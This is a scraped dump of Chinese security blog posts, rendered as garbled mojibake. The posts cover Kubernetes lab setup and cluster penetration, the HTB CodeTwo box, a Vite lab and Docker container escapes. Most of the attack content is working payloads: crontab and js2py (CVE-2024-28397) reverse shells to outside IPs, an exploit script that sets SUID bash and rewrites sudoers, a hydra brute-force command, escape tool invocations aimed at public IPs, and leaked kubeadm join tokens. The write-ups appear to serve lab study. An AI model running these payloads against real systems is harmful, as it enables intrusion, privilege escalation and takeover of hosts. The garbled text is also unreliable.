2/dev/null | openssl dgst -sha256 -hex | sed s/^.* //çœ‹hashnodeèŠ‚ç‚¹æ‰§è¡Œkubectl get pods -n kube-systemkubeadm join 192.168.79.141:6443 \\ --token dsfgdi.t1iz8mqhbh54o9qm \\ --discovery-token-ca-cert-hash sha256:e70c708dab7a60164b6023d26e57446f2a0cd21a4985d85554fa8642d9b33b8fèŠ‚ç‚¹åŠ å…¥é›†ç¾¤âŒ ä¸å½±å“èŠ‚ç‚¹åŠ å…¥ä¾èµ– kubeletå’Œ kube-proxyï¼Œä¸ä¾èµ– Calico çš„ BGPPod ç½‘ç»œäº’é€šâœ… â€‹â€‹å½±å“â€‹â€‹Calico é»˜è®¤ä¾èµ– BGP æˆ– IPIP å®ç°è·¨èŠ‚ç‚¹ Pod é€šä¿¡kubectl execâœ… â€‹â€‹å½±å“â€‹â€‹éœ€è¦è·¨èŠ‚ç‚¹ç½‘ç»œå¯è¾¾Service ç½‘ç»œâŒ ä¸å½±å“ç”± kube-proxyå¤„ç†ï¼Œä¸ä¾èµ– Calicosystemctl restart kubeletkubectl get nodes kubectl delete pods -n kube-system -l app=flannelwatch kubectl get pods -n kube-system -l app=flannelé‡ç½®Calico# å½»åº•åˆ é™¤ Calicokubectl delete -f calico-3.9.2.yamlrm -rf /etc/cni/net.d/calico-kubeconfig# æ¸…ç†ç½‘ç»œæ¥å£ip link delete cali0 2/dev/null || trueip link delete tunl0 2/dev/null || true# é‡æ–°å®‰è£…kubectl apply -f calico-3.9.2.yamlå„ç§é—®é¢˜åæˆåŠŸçš„é…ç½®----------------- å…³é”®containerd config default /etc/containerd/config.toml #ä¿®æ”¹æ–‡ä»¶https://blog.csdn.net/m0_68472908/article/details/146534195 è¿™ä¸ªåšå®¢çš„å’Œæˆ‘ä¸Šé¢çš„ç»“åˆç‰ˆæœ¬ä¿®æ”¹ä¸Šé¢ç‰ˆæœ¬vim /etc/containerd/config.tomlSystemdCgroup = false æ”¹ä¸º SystemdCgroup = true sandbox_image = k8s.gcr.io/pause:3.6 æ”¹ä¸ºï¼šsandbox_image = registry.aliyuncs.com/google_containers/pause:3.6 dockeré•œåƒå¯èƒ½è¦æ”¹ registry-mirrors: [ https://docker.hpcloud.cloud, https://docker.m.daocloud.io, https://docker.unsee.tech, https://docker.1panel.live, http://mirrors.ustc.edu.cn, https://docker.chenby.cn, http://mirror.azure.cn, https://dockerpull.org, https://dockerhub.icu, https://hub.rat.dev],exec-opts: [native.cgroupdriver=systemd]yum install wgetwget https://kuboard.cn/install-script/calico/calico-3.9.2.yamlexport POD_SUBNET=10.244.0.0/16sed -i s#192\\.168\\.0\\.0/16#$POD_SUBNET# calico-3.9.2.yamlkubectl apply -f calico-3.9.2.yamlsystemctl stop firewalld systemctl disable firewalldsed -i s/enforcing/disabled/ /etc/selinux/config setenforce 0rm -rf /etc/yum.repos.d/* curl -o /etc/yum.repos.d/aliyun.repo https://mirrors.aliyun.com/repo/Centos-7.repo2ï¼šcat /etc/hosts EOF192.168.180.110 k8s-master192.168.180.120 k8s-node1192.168.180.130 k8s-node2EOFhostnamectl set-hostname k8s-master bashhostnamectl set-hostname k8s-node1 bashhostnamectl set-hostname k8s-node2 bash#k8s-master:yum install chrony -yvim /etc/chrony.confserver ntp6.aliyun.com iburstallow 192.168.0.0/16systemctl enable chronyd.servicesystemctl restart chronyd.servicechronyc sourceschronyc -a makestep #k8s-node1/k8s-node2:yum install chrony -yvim /etc/chrony.confserver k8s-master iburstsystemctl enable chronyd.servicesystemctl restart chronyd.servicechronyc sources #å…³é—­äº¤æ¢åˆ†åŒºswapoff -ased -ri s/.*swap.*/#/ /etc/fstabmodprobe br_netfiltercat /etc/sysctl.conf EOFnet.ipv4.ip_forward = 1net.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOF sysctl -pyum install -y conntrack ntpdate ntp ipvsadm ipset iptables curl sysstat libseccomp wget vim net-tools gitcat /etc/sysconfig/modules/ipvs.modules EOF#!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shEOF chmod 755 /etc/sysconfig/modules/ipvs.modules bash /etc/sysconfig/modules/ipvs.modules lsmod | grep -e ip_vs -e nf_conntrack_ipv4lsmod | grep -e ip_vs -e nf_conntrackcat EOF /etc/modules-load.d/containerd.confoverlaybr_netfilterEOF modprobe overlaymodprobe br_netfilterwget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo #å®‰è£…dockeryum install -y containerd.io docker-ce docker-ce-climkdir /etc/containerd -p containerd config default /etc/containerd/config.toml #ä¿®æ”¹æ–‡ä»¶vim /etc/containerd/config.tomlSystemdCgroup = false æ”¹ä¸º SystemdCgroup = true sandbox_image = k8s.gcr.io/pause:3.6 æ”¹ä¸ºï¼šsandbox_image = registry.aliyuncs.com/google_containers/pause:3.6 #dockeråŠ é€Ÿcat /etc/docker/daemon.json EOF registry-mirrors: [ https://do.nark.eu.org, https://dc.j8.work, https://docker.m.daocloud.io, https://dockerproxy.com, https://docker.mirrors.ustc.edu.cn, https://docker.nju.edu.cn],exec-opts: [native.cgroupdriver=systemd]EOF systemctl enable containerd systemctl start containerdsystemctl enable docker systemctl start docker 8 cat EOF /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpgEOF yum clean all yum makecache fast#å®‰è£…æŒ‡å®šç‰ˆæœ¬yum install -y kubelet-1.23.0-0 kubeadm-1.23.0-0 kubectl-1.23.0-0 --disableexcludes=kubernetes vim /etc/sysconfig/kubeletKUBELET_EXTRA_ARGS=--cgroup-driver=systemd systemctl enable kubelet systemctl start kubelet #åˆå§‹åŒ–kubeadm init --kubernetes-version=v1.23.0 --pod-network-cidr=10.244.0.0/16 --image-repository registry.aliyuncs.com/google_containers --apiserver-advertise-address 192.168.180.110 #è¿™ä¸ªæ˜¯åˆå§‹åŒ–æˆåŠŸåæœ‰æ˜¾ç¤ºçš„export KUBECONFIG=/etc/kubernetes/admin.confmkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config#masteråˆå§‹åŒ–æˆåŠŸåå°†è¿™ä¸€æ®µå¤åˆ¶åˆ°ä¸¤ä¸ªèŠ‚ç‚¹ä¸ŠåŠ å…¥ç¾¤é›†kubeadm join 192.168.180.110:6443 --token 8zgrg1.dwy5s6rqzzhlkkdl --discovery-token-ca-cert-hash sha256:9dfa30a7a8314887ea01b05cc26e80856bfd253d1a71de7cd5501c42f11c0326kubectl apply -f https://docs.projectcalico.org/manifests/calico.yamlkubectl get pod -n kube-system -o wide è¿™é‡Œåªéœ€è¦ç­‰å¾…ä»–ä»¬å…¨éƒ¨runningå³å¯ kubectl get nodes K8Sé›†ç¾¤æ¸—é€ ç¡®ä¿éƒ½runningä¸ç„¶å®éªŒä¸è¡Œè€Œä¸”ç‰ˆæœ¬è¦åˆé€‚ 1ï¼šAPI Serveræœªæˆæƒè®¿é—®kubeletæœªæˆæƒè®¿é—®API Server èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€API æ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶æ—§ç‰ˆæœ¬çš„k8sçš„API Serveré»˜è®¤ä¼šå¼€å¯ä¸¤ä¸ªç«¯å£ï¼š8080å’Œ6443ã€‚6443æ˜¯å®‰å…¨ç«¯å£ï¼Œå®‰å…¨ç«¯å£ä½¿ç”¨TLSåŠ å¯†ï¼›ä½†æ˜¯8080ç«¯å£æ— éœ€è®¤è¯ï¼Œä»…ç”¨äºæµ‹è¯•ã€‚6443ç«¯å£éœ€è¦è®¤è¯ï¼Œä¸”æœ‰ TLS ä¿æŠ¤ã€‚ï¼ˆk8s1.16.0ï¼‰æ–°ç‰ˆæœ¬k8sé»˜è®¤å·²ç»ä¸å¼€å¯8080ã€‚éœ€è¦æ›´æ”¹ç›¸åº”çš„é…ç½®æ¼æ´æ¡ä»¶ï¼š1ã€Kubernetesç‰ˆæœ¬å°äº v1.202ã€8080ç«¯å£å¯è®¿é—®ï¼ˆé…ç½®ä¸å½“ï¼‰cd /etc/kubernetes/manifests/- --insecure-port=8080- --insecure-bind-address=0.0.0.0kubectl get pod -n kube-system -o wideæŸ¥çœ‹K8Sç½‘ç»œå·¥å…·æ­å»ºæƒ…å†µ å½“ä½ å‘ç°æœ‰æœªæˆæƒåä½¿ç”¨å®˜æ–¹å·¥å…·æ¥è®¿é—® kubectl.exe -s 192.168.79.141:8080 get nodes è·å–èŠ‚ç‚¹ä¿¡æ¯kubectl.exe -s 192.168.79.141:8080 get pods è·å–åº”ç”¨kubectl -s 192.168.79.141:8080 create -f test.yaml åˆ›å»ºæ–‡ä»¶podåº”ç”¨ä¸ºåˆ›å»ºé•œåƒkubectl -s 192.168.79.141:8080 --namespace=default exec -it åå­— bash è¿›å…¥é•œåƒecho -e * * * * * root bash -i /dev/tcp/ip/4444 01 /mnt/etc/crontab ç”¨æŒ‚è½½é€ƒé€¸è®¡åˆ’ä»»åŠ¡åå¼¹ test.yaml:apiVersion: v1kind: Podmetadata: name: manbospec: containers: \\- image: nginx name: test-container volumeMounts: \\- mountPath: /mnt name: test-volume volumes: \\- name: test-volume hostPath: path: / åˆ›å»ºèŠ‚ç‚¹æŸ¥çœ‹PODæˆåŠŸåˆ›å»º è¿›å…¥ echo -e â€œ* * * * * root bash -i devtcp116.62.32.644444 01 â€ mntetccrontabåå¼¹è·å¾—æœ¬æœºshell æˆåŠŸæ‹¿ä¸‹è¿™å°dockeré•œåƒçš„æœ¬æœºnode1 2ã€æ”»å‡»6443ç«¯å£ï¼šAPI Serveræœªæˆæƒè®¿é—®ä¸€äº›é›†ç¾¤ç”±äºé‰´æƒé…ç½®ä¸å½“ï¼Œå°†system:anonymousç”¨æˆ·ç»‘å®šåˆ°cluster-adminç”¨æˆ·ç»„ï¼Œä»è€Œä½¿6443ç«¯å£å…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤å†…éƒ¨ä¸‹å‘æŒ‡ä»¤ã€‚kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous è®°å¾—ç”¨httpsè®¿é—® å‘æ¶æ„yamlæ–‡ä»¶åŒ… https://192.168.139.130:6443/api/v1/namespaces/default/pods/ POSTï¼šapiVersion:v1,kind:Pod,metadata:annotations:kubectl.kubernetes.io/last-applied-configuration:\\apiVersion\\:\\v1\\,\\kind\\:\\Pod\\,\\metadata\\:\\annotations\\:, ame\\:\\test02\\, amespace\\:\\default\\,\\spec\\:\\containers\\:[\\image\\: ginx:1.14.2\\, ame\\:\\test02\\,\\volumeMounts\\:[\\mountPath\\:\\/host\\, ame\\:\\host\\]],\\volumes\\:[\\hostPath\\:\\path\\:\\/\\,\\type\\:\\Directory\\, ame\\:\\host\\] ,name:test02,namespace:default,spec:containers:[image:nginx:1.14.2,name:test02,volumeMounts:[mountPath:/host,name:host]],volumes:[hostPath:path:/,type:Directory,name:host] æˆåŠŸåˆ›å»ºpod å¹¶ä¸”æŒ‚è½½åˆ°hosté‡Œé¢ä¸€æ ·ä½¿ç”¨mntææƒ è¿›å…¥æ–¹å¼ kubectl --insecure-skip-tls-verify -s https://192.168.79.131:6443 --namespace=default exec -it heikea bashkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.Please enter Username: rroot@heikea:/#root@heikea:/#root@heikea:/#kubectl.exe -s 192.168.79.131:8080 --namespace=default exec -it heikea bash 3ã€æ”»å‡»10250ç«¯å£ï¼škubeletæœªæˆæƒè®¿é—®é…ç½®é—®é¢˜ https://192.168.79.131:10250/pods/var/lib/kubelet/config.yamlä¿®æ”¹authenticationçš„anonymousä¸ºtrue,å°†authorization modeä¿®æ”¹ä¸ºAlwaysAllow,é‡å¯kubeletè¿›ç¨‹-systemctl restart kubelet æ²¡æœ‰é…ç½®çš„æ—¶å€™è¿›ä¸å»ä¸€æ—¦ä¿®æ”¹ ä¿®æ”¹å è·å¾—ä¸‰ä¸ªä¿¡æ¯ 1ï¼šnamespace= kube-system2: pod= etcd-master-13: container =etcdcurl -XPOST -k https://192.168.79.131:10250/run/kube-system/etcd-master-1/etcd -d cmd=idæˆåŠŸå‘½ä»¤æ‰§è¡Œè¢«æ”»å‡»çš„ Docker é•œåƒå¯¹åº”çš„æ˜¯ kube-scheduler ç»„ä»¶è¯¥è¯·æ±‚çš„æœ¬è´¨æ˜¯é€šè¿‡ Kubelet çš„ 10250 ç«¯å£ï¼ˆé»˜è®¤åªè¯»ç«¯å£ï¼Œè‹¥è¢«é…ç½®ä¸ºå¯å†™åˆ™å­˜åœ¨é£é™©ï¼‰ï¼Œåœ¨ kube-scheduler-master-1 Pod çš„ kube-scheduler å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ï¼ˆå¦‚ idï¼‰åœ¨fofaæœç´¢port=10250 6443æµ‹è¯•","tags":["k8s"]},{"title":"Pane12é¶æœº-VITE","path":"/2025/08/26/posts/pane12/","content":"Pane12é¶æœº-Vite-å®å¡”ææƒ è¿™è¾¹ç›´æ¥è¿›å…¥8080ç«¯å£æ‰“å¼€vite å¯åŠ¨åè®¿é—®3000ç«¯å£æ˜¯ä¸€ä¸ªå®å¡”çš„ç•Œé¢ è¿™é‡Œä½¿ç”¨nucleiæˆ–è€…ä½ æœç´¢CVEæœç´¢æ¼æ´å¯ä»¥å‘ç°ä¸€ä¸ªCVE-2025-31125 192.168.1.208:3000@fsetcpasswd?import?inline1.wasm?init base64è§£å¯† hydra -l welcome -P /usr/share/john/password.lst ssh://192.168.1.208:22 -V -I -f -u -t 50 -e nsr æ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·çˆ†ç ´ å‘ç°ä¸€ä¸ªå®å¡”çš„ç¨‹åºå¯ä»¥å…ˆä¿®æ”¹é¢æ¿å¯†ç ç„¶åè¿›å…¥ è¿›å…¥åè¿™é‡Œå‘ç°ä¸¤ä¸ªä¸€ä¸ªæ˜¯ç›´æ¥æ‰“å¼€ç»ˆç«¯ è¿˜æœ‰å†™è®¡åˆ’ä»»åŠ¡ å®å¡”çš„è®¡åˆ’ä»»åŠ¡ç›®å½•åœ¨ wwwservercron","tags":["Vite"]},{"title":"CodeTwoé¶æœº-HTB","path":"/2025/08/25/posts/CodeTwo/","content":"CodeTwoé¶æœº-HTB æ‰«æå‘ç°äº†8000ç«¯å£å¯ä»¥ä¸‹è½½æºç å¹¶æ‰§è¡ŒJSå‘½ä»¤ä¸‹è½½åˆ†æè¿™æ˜¯ä¸€ä¸ªflaskæ¡†æ¶ä½¿ç”¨js2pyæ¥æ‰§è¡ŒJSä»£ç å¹¶ä¸”ä½¿ç”¨çš„sqliteæ•°æ®åº“æ–¹ä¾¿å¿«æ·SQLite3 æœ¬èº«ä¸æä¾›å¯†ç ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå•æ–‡ä»¶æ•°æ®åº“ï¼Œæ•°æ®å­˜å‚¨åœ¨ .dbæ–‡ä»¶é‡Œï¼ˆå¦‚ users.dbï¼‰ã€‚js2pyçš„æŸä¸ªå…¨å±€å˜é‡å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¼æ´åœ¨jsä»£ç ä¸­è·å¾—ä¸€ä¸ªpythonå¯¹è±¡çš„å¼•ç”¨ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€ƒé€¸jsç¯å¢ƒï¼Œåœ¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚CVE-2024-28397let cmd = bash -c bash -i /dev/tcp/10.10.16.28/3333 01;let hacked, bymarve, n11;let getattr, obj; hacked = Object.getOwnPropertyNames();bymarve = hacked.__getattribute__;n11 = bymarve(__getattribute__); obj = n11(__class__).__base__;getattr = obj.__getattribute__; function findpopen(o) let result; for (let i in o.__subclasses__()) let item = o.__subclasses__()[i]; if (item.__module__ == subprocess item.__name__ == Popen) return item; if (item.__name__ != type (result = findpopen(item))) return result; findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();OK; åå¼¹æˆåŠŸåsqliteä¸€èˆ¬åœ¨Instanceä¸‹é¢æˆ‘ä»¬ä½¿ç”¨sqlite3æ¥æŸ¥çœ‹æ•°æ®åº“ sqlite3 /home/app/instance/users.db.tablescode_snippet user SELECT * FROM user;1|marco|649c9d65a206a75f5abe509fe128bce52|app|a97588c0e2fa3a024876339e27aeb42e3|123|202cb962ac59075b964b07152d234b70MD5 åˆ†æç ´è§£ç»“æœ: sweetangelbabylove ç™»å½•ä¸Šå»å‘ç°å¯ä»¥ä½¿ç”¨npbackup-clinpbackup-cliæ˜¯ä¸€ä¸ªåŸºäº Restic çš„å¤‡ä»½å·¥å…·Restic æ˜¯ä¸€ä¸ªå¼€æºã€è·¨å¹³å°çš„å¤‡ä»½å·¥å…·ï¼Œä¸“æ³¨äºå®‰å…¨ã€é«˜æ•ˆå’Œæ˜“ç”¨æ€§ã€‚å®ƒé‡‡ç”¨åŠ å¯†å­˜å‚¨ï¼Œæ”¯æŒå¢é‡å¤‡ä»½ï¼Œå¹¶å¯ä»¥å­˜å‚¨æ•°æ®åˆ°å¤šç§åç«¯ï¼ˆå¦‚æœ¬åœ°ç£ç›˜ã€SFTPã€AWS S3ã€MinIO ç­‰ï¼‰ã€‚marco@codetwo:~$ cat /tmp/exploit.sh EOF #!/bin/bash # è®¾ç½®SUIDæƒé™ chmod +s /bin/bash # æˆ–è€…ç›´æ¥æ·»åŠ sudoæƒé™ echo marco ALL=(ALL) NOPASSWD:ALL /etc/sudoers EOFsudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --external-backend-binary=/tmp/exploit.sh --backup--external-backend-binary=/tmp/exploit.shâ†’ è®©npbackupæ‰§è¡Œä½ çš„è„šæœ¬--backup /etc/passwd /tmp/â†’ è§¦å‘å¤‡ä»½æ“ä½œï¼Œä½¿è„šæœ¬è¢«æ‰§è¡Œ","tags":["HTB"]},{"title":"Docker-é€ƒé€¸-LINuxå†…æ ¸æ¼æ´","path":"/2025/08/25/posts/docker3/","content":"Docker-é€ƒé€¸-LINuxå†…æ ¸æ¼æ´ å¦‚ä½•åˆ¤æ–­åœ¨ä¸åœ¨dockerç¯å¢ƒå®¹å™¨é€ƒé€¸æ–¹æ³•æ£€æµ‹æŒ‡åŒ— | T Wiki 1.cat /proc/1/cgroup | grep -qi docker echo Is Docker || echo Not Docker2.æ£€æŸ¥/.dockerenvæ–‡ä»¶3.æ£€æŸ¥mountä¿¡æ¯4.æŸ¥çœ‹ç¡¬ç›˜ fdisk -lå¦‚æœæµ‹è¯•äº†ç‰¹æƒä¸è¡Œï¼Œsocket,æŒ‚è½½éƒ½æ²¡æœ‰ï¼Œå°±æµ‹è¯•dockeræ¼æ´ï¼Œå†…æ ¸æ¼æ´ï¼Œç¿»æ•°æ®åº“æ–‡ä»¶æ‰¾å’Œä¸»ç›®å½•æœ‰äº¤é›†çš„æ–‡ä»¶å¦‚æœæ˜¯JAVAåº”ç”¨ä½ è¿›å»å°±æ˜¯ROOT å°±è€ƒè™‘é€ƒé€¸å¦‚æœæ˜¯WWWé‚£ä¹ˆè¿˜è¦åŠ ä¸€æ­¥ææƒåˆ°ROOT å†åˆ°é€ƒé€¸ LINUXå†…æ ¸æ¼æ´ CVE-2022-0492å½±å“ç‰ˆæœ¬: linux kernel 5.17-rc3æ¼æ´å±å®³: å½“å®¹å™¨æ²¡æœ‰å¼€å¯é¢å¤–å®‰å…¨æªæ–½æ—¶ï¼Œè·å¾—å®¹å™¨å†…rootæƒé™å³å¯é€ƒé€¸åˆ°å®¿ä¸»æœºä¸‹è½½POCè§£å‹åˆ›å»ºä¸€ä¸ªæœ‰ç¼ºé™·çš„DOCKERä¸Šä¼ æ‰§è¡ŒEXPdocker run --rm -it --cap-add=SYS_ADMIN --security-opt=apparmor=unconfined ubuntu:20.04 /bin/bash docker cp exp.sh 11e84a3b3d90:/ å¤åˆ¶ä¸Šä¼  å¦‚æœçœŸå®ç¯å¢ƒå°±ä¸‹è½½wgetå•Šä»€ä¹ˆçš„chmod 777 exp.sh./exp.sh cat /etc/passwd å†…æ ¸æ¼æ´-CVE-2022-0847å½±å“ç‰ˆæœ¬: é«˜äº5.8çš„Linuxå†…æ ¸ç‰ˆæœ¬ä¼šå—åˆ°å½±å“æ¼æ´å±å®³ï¼šæ”»å‡»è€…é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯è¦†ç›–é‡å†™ä»»æ„å¯è¯»æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œä»è€Œå¯å°†æ™®é€šæƒé™çš„ç”¨æˆ·æå‡åˆ°ç‰¹æƒrootå¤ç°ç¯å¢ƒï¼šUbuntu 16.04 X64å‚è€ƒï¼šwiki.teamssix.com/CloudNative/Docker/CVE-2022-0847.htmlåˆ©ç”¨ï¼šgithub.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.gitCVE-2022-0847-DirtyPipe-Exploits-main ä¸Šä¼ é‡Œé¢ä¸‰ä¸ªæ–‡ä»¶ç¼–è¯‘æ‰§è¡Œdocker run -itd ubuntu:latest å¯åŠ¨é•œåƒapt-get updateæ›´æ–°apt-get install gcc å¦‚æœç¼–è¯‘å®Œä¸Šä¼ ä¸Šå»å¯èƒ½æœ‰ç‰ˆæœ¬å·®å¼‚ ç”Ÿæˆæ–‡ä»¶æ¥æ‰§è¡Œ Dockerè¿œç¨‹ APIæœªæˆæƒè®¿é—®é€ƒé€¸å½“Dockerå®ˆæŠ¤è¿›ç¨‹è¢«é…ç½®ä¸ºç›‘å¬ç½‘ç»œç«¯å£ï¼ˆé€šå¸¸æ˜¯TCPç«¯å£2375ï¼‰ä¸”æœªå¯ç”¨é€‚å½“çš„èº«ä»½éªŒè¯æœºåˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æœªç»æˆæƒè®¿é—®Docker APIã€‚åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸»æœºç³»ç»Ÿä¸Šåˆ›å»ºã€ä¿®æ”¹å’Œæ‰§è¡Œå®¹å™¨ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€æ•°æ®çªƒå–ä»¥åŠå®Œå…¨æ§åˆ¶ä¸»æœºç³»ç»Ÿã€‚é€šå¸¸ç«¯å£æ˜¯2375 åŸç†é€šè¿‡æœªæˆæƒåˆ›å»ºå®¹å™¨æŒ‚è½½åå¾€è®¡åˆ’ä»»åŠ¡å†™å…¥åå¼¹shellä¸åŒç¯å¢ƒè®¡åˆ’ä»»åŠ¡ä¸åŒ ä¸åŒç³»ç»Ÿå¯èƒ½åå¼¹å‘½ä»¤ä¸åŒä½¿ç”¨dockerRemoteApiGetRootShellæ”»å‡» é¡¹ç›®å¦‚ä¸‹ éœ€è¦python2æ¥è¿è¡Œåå¼¹éœ€è¦é•œåƒåå­—ä½†æ˜¯è¿™ä¸ªé¶åœºå¯èƒ½ç¯å¢ƒæœ‰é—®é¢˜ å¤ç°ç¯å¢ƒï¼šhttp://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce åˆ©ç”¨é¡¹ç›®ï¼šhttps://github.com/xiju2003/dockerRemoteApiGetRootShell-fix ##å®‰è£…ç±»åº“ pip install -r requirements.txt ##æŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 ##æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a ##æŸ¥çœ‹æ‰€æœ‰é•œåƒ python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l ##æŸ¥çœ‹ç«¯å£æ˜ å°„ python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L ##å†™è®¡åˆ’ä»»åŠ¡ï¼ˆcentos,redhatç­‰,åŠ -uå‚æ•°ç”¨äºubuntuç­‰ï¼‰ python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i é•œåƒå -H åå¼¹ip -P åå¼¹ç«¯å£python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i é•œåƒå -H åå¼¹ip -P åå¼¹ç«¯å£ ##å†™sshkey(è‡ªè¡Œä¿®æ”¹è„šæœ¬çš„ä¸­å…¬é’¥) python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i é•œåƒå -k ##åœ¨å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -e id -I å®¹å™¨id ##åˆ é™¤å®¹å™¨ python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I å®¹å™¨id ##ä¿®æ”¹client apiç‰ˆæœ¬ python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22 ##æŸ¥çœ‹æœåŠ¡ç«¯apiç‰ˆæœ¬ python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V","tags":["docker"]},{"title":"Docker-é€ƒé€¸-æœ¬èº«æ¼æ´-CDKå·¥å…·ä½¿ç”¨","path":"/2025/08/23/posts/docker2/","content":"Docker-é€ƒé€¸-æœ¬èº«æ¼æ´-CDKå·¥å…·ä½¿ç”¨ å¦‚ä½•åˆ¤æ–­åœ¨ä¸åœ¨dockerç¯å¢ƒå®¹å™¨é€ƒé€¸æ–¹æ³•æ£€æµ‹æŒ‡åŒ— | T Wiki 1.cat /proc/1/cgroup | grep -qi docker echo Is Docker || echo Not Docker2.æ£€æŸ¥/.dockerenvæ–‡ä»¶3.æ£€æŸ¥mountä¿¡æ¯4.æŸ¥çœ‹ç¡¬ç›˜ fdisk -lå¦‚æœæµ‹è¯•äº†ç‰¹æƒä¸è¡Œï¼Œsocket,æŒ‚è½½éƒ½æ²¡æœ‰ï¼Œå°±æµ‹è¯•dockeræ¼æ´ï¼Œå†…æ ¸æ¼æ´ï¼Œç¿»æ•°æ®åº“æ–‡ä»¶æ‰¾å’Œä¸»ç›®å½•æœ‰äº¤é›†çš„æ–‡ä»¶å¦‚æœæ˜¯JAVAåº”ç”¨ä½ è¿›å»å°±æ˜¯ROOT å°±è€ƒè™‘é€ƒé€¸å¦‚æœæ˜¯WWWé‚£ä¹ˆè¿˜è¦åŠ ä¸€æ­¥ææƒåˆ°ROOT å†åˆ°é€ƒé€¸ æœ¬èº«æ¼æ´CVE-2019-5736 runCå®¹å™¨é€ƒé€¸Docker version = 18.09.2RunC version = 1.0-rc6æ¡ä»¶å¦‚ä¸Šéœ€è¦goè¯­è¨€æ¥ç¼–è¯‘POC è¿™ä¸ªç¼ºé™·æ˜¯éœ€è¦ç®¡ç†å‘˜è‡ªå·±è¿›å…¥æ‰èƒ½è§¦å‘----sudo yum install golangCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go linuxç¯å¢ƒç¼–è¯‘docker run -itd --cap-add=SYS_ADMIN ubuntu:lateståˆ›å»ºç¯å¢ƒdocker cp main name:/ ä¸Šä¼ é•œåƒdocker exec -it name /bin/sh è§¦å‘åå¼¹ https://github.com/Frichetten/CVE-2019-5736-PoC ä¸‹è½½pocä¿®æ”¹åå¼¹ä»£ç  ä¸Šä¼ æ–‡ä»¶æ‰§è¡Œ æ¨¡æ‹Ÿç®¡ç†å‘˜ç™»å½• è‡ªåŠ¨åå¼¹æœ¬æœºçš„æ–‡ä»¶ROOTåˆ°åå¼¹çš„ä½ç½® d CVE-2020-15257 containerdé€ƒé€¸-å·¥å…·CDKä»‹ç»containerd 1.4.3containerd 1.3.9æˆ‘ä»¬ä½¿ç”¨å·¥å…·æ¥é€ƒé€¸ä¸Šä¼ è¿›å»æ·»åŠ 777æƒé™æ™®é€šæ£€æµ‹./cdk_linux_amd64 evaluate ./cdk_linux_amd64 run shim-pwn reverse xx.xx.xx.xx xxxx ä½¿ç”¨CVE-2020-15257å¦‚æœæ£€æµ‹åˆ°å°±ä½¿ç”¨ ä¾‹å¦‚ç‰¹æƒæ¨¡å¼æŒ‚è½½å‘½ä»¤ ./cdk run mount-disk socketæŒ‚è½½æ¼æ´ ./cdk run docker-sock-pwn /var/run/docker.sock touch /host/tmp/pwn-success å‘½ä»¤æ‰§è¡Œ\tUsage: cdk evaluate [--full] cdk run (--list | exploit [args...]) cdk tool [args...]Evaluate: cdk evaluate Gather information to find weekness inside container. cdk evaluate --full Enable file scan during information gathering.Exploit: cdk run --list List all available exploits. cdk run exploit [args...] Run single exploit, docs in https://github.com/Xyntax/CDK/wikiTool: vi file Edit files in container like vi command. ps Show process information like ps -ef command. nc [options] Create TCP tunnel. ifconfig Show network information. kcurl\t(get|post) url data Make request to K8s api-server. ucurl (get|post) socket uri data Make request to docker unix socket. probe ip port parallel timeout-ms TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000Options: -h --help Show this help msg. -v --version Show version. https://github.com/cdk-team/CDK 